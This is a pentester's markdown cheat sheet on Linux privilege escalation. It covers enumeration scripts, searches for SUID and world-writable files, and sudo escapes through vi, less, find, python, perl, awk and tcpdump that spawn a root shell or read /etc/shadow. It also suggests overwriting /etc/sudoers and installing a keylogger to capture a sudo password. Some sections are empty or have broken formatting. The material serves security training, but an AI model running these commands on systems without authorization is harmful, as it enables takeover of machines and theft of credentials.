# Privilege Escalation

So you have a limited shell on the machine.

You can't hide very effectively.   
You can't bind ports below 1024.  
Read and write any file  
Persist easily between reboots.

These are all things we want to be able to do.  



These are some Linux privilege escalation techniques are common:

- Kernel exploits
- Programs running as root
- Installed software
- Weak/reused/plaintext passwords
- Inside service
- Suid misconfiguration
- World writable scripts invoked by root
- Unmounted filesystems
- Private ssh keys
- Bad path configuration
- Cronjobs


## Enumeration scripts


**LinEnum**

This script can be used to speed up our enumeration-process.

[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

Here are the options:

```
-k Enter keyword
-e Enter export location
-t Include thorough (lengthy) tests
-r Enter report name
-h Displays this help text
```

**Unix privesc**

[http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)  
Run the script and save the output in a file, and then grep for warning in it.

**Linprivchecker.py**

[https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py](https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py)



## Privilege Escalation Techniques

### Kernel Exploits

Check the following:
OS:
Architecture:
Kernel version:

```
uname -a
cat /proc/version
cat /etc/issue
```

**Search for exploits**

```
site:exploit-db.com kernel version

python linprivchecker.py extended
```

Don't use binary exploits if you can avoid it. If you use it it might crash the machine. So binary exploits should be the last resort. Always use a simpler priv-esc if you can. They can also produce a lot of stuff in the `sys.log`. So if you find anything good, put it up on your list and keep searching for other ways before exploiting it.


### Programs running as root

Look for webserver, mysql or anything else like that. The idea here is that if specific service is running as root and you can make that service execute commands you can execute commands as root. A typical example of this is mysql.

**Check which processes are running**

```
# Metasploit
ps

# Linux
ps aux
```

**Mysql**

If you find that mysql is running as root and you username and password to log in to the database you can issue the following commands:

```mysql
select sys_exec('whoami');
select sys_eval('whoami');
```

If neither of those won't work you can use a [User Defined Function/](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/)


### User Installed Software

Has the user maybe installed some third party software that might be vulnerable? Check it out. If you find anything google it for exploits.

```
# Common locations for user installed software
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```

### Weak/reused/plaintext passwords

- Check database config-file (`config.php` or similar)
- Check databases
- Check weak passwords

```
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

- Check plaintext password

```
./LinEnum.sh -t -k password
```

### Service only available from inside

It might be that case that the user is running some service that is only abailable from that user. You can't connect to the service from the outside. It might be a development server, a database, or anything else. These services might be running as root, or they might have vulnerabilities in them. They might be even more vulnerable since the developer or user might be thinking "since it is only accessible for the specific user we don't need to spend that much of security"

Check the netstat and compare it with the scan you did from the outside.

```
# Linux
netstat -anlp
netstat -ano
```

### Suid Misconfiguration



## Communication

### Mail

```
/var/spool/mail
```

## Logs

## References

[http://www.rebootuser.com/?p=1758](http://www.rebootuser.com/?p=1758)

[http://netsec.ws/?p=309](http://netsec.ws/?p=309)

# Privilege Escalation - Linux

### Weak or reused passwords

If there is a web-server, check the connection to the database. Try that password. Also log into the database with the user you found. Is there a admin-account that might be reusing passwords?

Config-files  
postfix  
newsbeauter

### Configuration mistakes


#### Bad path configuration

Putting . in the path  
If you put a dot in your path you won't have to write `./binary to be able to execute it. You will be able to execute any script or binary that is in the current directory.`

Why do people/sysadmins do this? Because they are lazy and won't want to write `./.`

This explains it  
[https://hackmag.com/security/reach-the-root/](https://hackmag.com/security/reach-the-root/)  
And here  
[http://www.dankalia.com/tutor/01005/0100501004.htm](http://www.dankalia.com/tutor/01005/0100501004.htm)

#### **Cronjob**

With privileges running script that are editable for other users.

#### World writable scripts invoked as root

World/user writable scripts that are invoked by root can me rewritten to escalate privileges.

Also check scripts that are called by these scripts.

```
#World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

#### World/user writable binaries

#### Weak permissions on LD\_preload

[https://blog.maleadt.net/2015/02/25/sudo-escalation/](https://blog.maleadt.net/2015/02/25/sudo-escalation/)

#### Homemade crappy suid programs

**SUID files**

SUID is a bit that you can set on a file. If you run a binary the binary is run as the user who is running it. But if the binary has the SUID-bit it will be run as the owner of that binary. This can be abused.

Here is how you find SUID files:

```
find / -perm -u=s -type f 2>/dev/null
```

Run ltrace on them to see what they do.

#### Setuid/setuig

SUID is a bit that you can set on a file. If you run a binary the binary is run as the user who is running it. But if the binary has the SUID-bit it will be run as the owner of that binary. This can be abused.  
Any editor with a setudi/setuig can be abused.

**nmap**  
SUID on nmap.

Find them

```
#Find SUID
find / -perm -u=s -type f 2>/dev/null

#Find GUID
find / -perm -g=s -type f 2>/dev/null
```

### Abusing sudo-rights

If you have a shell that has limited sudo programs you might still be able to use it. Any program that can write or overwrite can be used. If you have `cp you can overwrite /etc/shadow or /etc/sudoers.   
`**`ht`**`  
The text/binary-editor HT running as sudo`

**nano**

**vi/vim**  
With vi it is even easier. Just open vi

```
sudo vi
:shell

:set shell=/bin/bash:shell    
:!bash
```

And you have shell.

**less**  
From less you can go into vi, and then into a shell

```
sudo less /etc/shadow
v
:shell
```

**more**  
You need to run more on a file that is bigger than your screen.

```
sudo more /home/pelle/myfile
!/bin/bash
```

**cp**  
Copy and overwrite /etc/shadow

**mv**  
Overwrite /etc/shadow or /etc/sudoers

**find**

```
sudo find / -exec bash -i \;

find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
```

**python/perl/ruby/lua/etc**

```
sudo perl
exec "/bin/bash";
ctr-d
```

```
sudo python
import os
os.system("/bin/bash")
```

**nmap**

**awk**

```
awk 'BEGIN {system("/bin/bash")}'
```

**bash**

**sh**

**man**

**nc**

**netcat**

**ruby**

**lua**

**irb**

**tcpdump**

[https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/](https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/)

```
echo $'id\ncat /etc/shadow' > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

**emacs**

### Software vulnerabilites

Software vulnerabilites can lead to priv-esc, like vulnerabiliteis in:

* Kernel


  `uname -a`
  `uname -r`
  `/etc/issue*`
  `/etc/release`
  `cat /proc/version`

# RHEL/CentOS/Suse/Fedora

rpm -q kernel

# Debian

dpkg --list \| grep linux-image

```
**Tools**
```

# Programming tools

find / -name perl_  
find / -name python_  
find / -name gcc\*  
find / -name cc

# Upload tools

```
find / -name wget  
find / -name nc  
find / -name netcat  
find / -name tftp*  
find / -name ftp  
```

# Writetable Directories

``` 
/tmp
/var/tmp
/dev/shm
/var/spool/vbox
/var/spool/samba
```

#### Binary expoits against root owned binaries

* sudo
* Chrootkit

## Keylogger

If you have access to an account with sudo-rights but you don't have its password you can install a keylogger to get it.

## References

[https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/](https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/)

Watch this video!  
[http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams](http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams)

[http://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections](http://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections)

[http://netsec.ws/?p=309](http://netsec.ws/?p=309)

[https://www.rebootuser.com/?page\_id=1721](https://www.rebootuser.com/?page_id=1721)

